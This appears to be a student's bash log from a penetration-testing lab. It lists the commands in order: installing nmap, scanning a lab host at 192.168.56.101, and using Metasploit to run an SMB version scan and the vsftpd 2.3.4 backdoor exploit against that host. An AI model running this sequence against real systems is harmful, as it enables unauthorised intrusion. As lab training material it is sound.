#!/bin/bash
# Lab 20 — Penetration Testing & Red Team Exercises
# Commands Executed During Lab (sequential, no explanations)

sudo apt-get update
sudo apt-get install nmap

nmap -sV 192.168.56.101

msfconsole

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.101
run

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
exploit
